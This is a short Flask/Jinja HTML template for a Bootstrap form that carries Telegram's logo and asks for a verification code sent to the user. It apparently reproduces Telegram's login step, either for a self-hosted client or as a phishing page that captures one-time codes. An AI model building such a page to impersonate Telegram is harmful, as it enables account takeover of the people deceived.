<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enter a Password</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f8f9fa;
        }
        .form-signin {
            width: 100%;
            max-width: 330px;
            padding: 15px;
            text-align: center;
        }
        .form-signin img {
            margin-bottom: 15px;
        }
        .btn-block {
            width: 100%;
        }
    </style>
</head>
<body>
    <form class="form-signin" action="/" method="post">
        <input type="hidden" name="action" value="verify_code">
        <img src="https://telegram.org/img/t_logo.png" alt="Telegram Logo" width="100" height="100">
        <h1 class="h3 mb-3 font-weight-normal">Enter code</h1>
        <p>We sent you the code</p>
        <div class="form-floating mb-3">
            <input type="text" name="code" class="form-control" placeholder="Verification code" required>
            <label for="code">Verification code</label>
        </div>
        <button class="btn btn-lg btn-primary btn-block" type="submit">Next</button>
        {% with messages = get_flashed_messages() %}
        {% if messages %}
        <div class="alert alert-warning mt-3">
            {% for message in messages %}
            <p>{{ message }}</p>
            {% endfor %}
        </div>
        {% endif %}
        {% endwith %}
    </form>
</body>
</html>
